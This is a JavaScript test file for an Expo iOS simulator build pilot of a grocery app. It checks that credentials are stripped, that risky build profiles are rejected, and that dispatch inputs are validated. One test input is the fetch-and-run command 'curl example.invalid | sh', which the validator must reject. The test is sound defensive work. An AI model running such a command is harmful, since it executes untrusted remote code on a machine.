import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { createRequire } from "node:module";
import { test } from "node:test";
import { buildEnvironment, validateDispatch, validateProfile } from "./feel-simulator.mjs";

const require = createRequire(import.meta.url);
const configure = require("../app.config.js");
const appJson = require("../app.json");
const eas = JSON.parse(readFileSync(new URL("../eas.json", import.meta.url), "utf8"));
const { ios, ...common } = eas.build["feel-simulator"];
const resolved = {
  platform: "ios",
  profile: "feel-simulator",
  buildProfile: { credentialsSource: "remote", ...common, ...ios },
  submitProfile: null,
};

test("simulator environment discards credentials and private service settings", () => {
  const env = buildEnvironment(resolved.buildProfile, {
    PATH: "/usr/bin",
    GH_TOKEN: "private-token",
    SENTRY_AUTH_TOKEN: "private-token",
    EXPO_PUBLIC_CLERK_PUBLISHABLE_KEY: "pk_live_private",
    EXPO_PUBLIC_SENTRY_DSN: "private-dsn",
    EXPO_PUBLIC_COPILOTKIT_RUNTIME_URL: "https://private.example",
    EAS_IOS_DIST_P12: "private-signing",
  });
  assert.equal(env.GH_TOKEN, undefined);
  assert.equal(env.SENTRY_AUTH_TOKEN, undefined);
  assert.equal(env.EAS_IOS_DIST_P12, undefined);
  assert.equal(env.EXPO_PUBLIC_CLERK_PUBLISHABLE_KEY, "");
  assert.equal(env.EXPO_PUBLIC_SENTRY_DSN, "");
  assert.equal(env.EXPO_PUBLIC_COPILOTKIT_RUNTIME_URL, "https://example.invalid/copilotkit");
  assert.equal(env.EXPO_NO_DOTENV, "1");
  assert.equal(env.SENTRY_DISABLE_AUTO_UPLOAD, "true");
  assert.equal(env.SENTRY_CLI_EXECUTABLE, "/usr/bin/false");
});

test("resolved profile rejects store, signed, Android, submit, and inherited production plans", () => {
  assert.doesNotThrow(() => validateProfile(resolved, eas));
  for (const changes of [
    { distribution: "store" },
    { simulator: false },
    { withoutCredentials: false },
    { autoIncrement: true },
    { developmentClient: true },
  ]) {
    assert.throws(() =>
      validateProfile({ ...resolved, buildProfile: { ...resolved.buildProfile, ...changes } }, eas),
    );
  }
  assert.throws(() => validateProfile({ ...resolved, platform: "android" }, eas));
  assert.throws(() => validateProfile({ ...resolved, submitProfile: {} }, eas));
  assert.equal(eas.cli.appVersionSource, "remote");
  assert.equal(eas.build.production.autoIncrement, true);
});

test("dispatch rejects credential-bearing env, custom prebuild commands, and other refs", () => {
  const plan = {
    simulator: "true",
    without_credentials: "true",
    development_client: "false",
    distribution: "internal",
    build_configuration: "Release",
    export_method: "",
    node_version: "24.18.1",
    package_manager: "pnpm",
    auto_increment: "false",
    prebuild_command: "",
    env_json: JSON.stringify(common.env),
    ref: "pilot/feel-deploy-ios-simulator",
  };
  const check = (value) =>
    validateDispatch(value, resolved.buildProfile, "refs/heads/pilot/feel-deploy-ios-simulator");
  assert.doesNotThrow(() => check(plan));
  assert.throws(() => check({ ...plan, env_json: '{"GH_TOKEN":"private-token"}' }));
  assert.throws(() => check({ ...plan, prebuild_command: "curl example.invalid | sh" }));
  assert.throws(() => check({ ...plan, ref: "main" }));
});

test("pilot identity and settings apply only to the explicit pilot flag", () => {
  const original = process.env.GROCERY_FEEL_SIMULATOR;
  try {
    delete process.env.GROCERY_FEEL_SIMULATOR;
    const normal = configure({ config: appJson.expo });
    assert.equal(normal.ios.bundleIdentifier, "dev.agents.grocery");
    assert.equal(normal.name, "Grocery Agent");
    process.env.GROCERY_FEEL_SIMULATOR = "1";
    const pilot = configure({ config: appJson.expo });
    assert.equal(pilot.ios.bundleIdentifier, "dev.agents.grocery.feelpilot");
    assert.equal(pilot.ios.buildNumber, "1");
    assert.equal(pilot.extra.clerkPublishableKey, "");
    assert.equal(pilot.extra.copilotKitRuntimeUrl, "https://example.invalid/copilotkit");
    assert.deepEqual(pilot.android, normal.android);
    assert.deepEqual(pilot.plugins, normal.plugins);
  } finally {
    if (original === undefined) delete process.env.GROCERY_FEEL_SIMULATOR;
    else process.env.GROCERY_FEEL_SIMULATOR = original;
  }
});
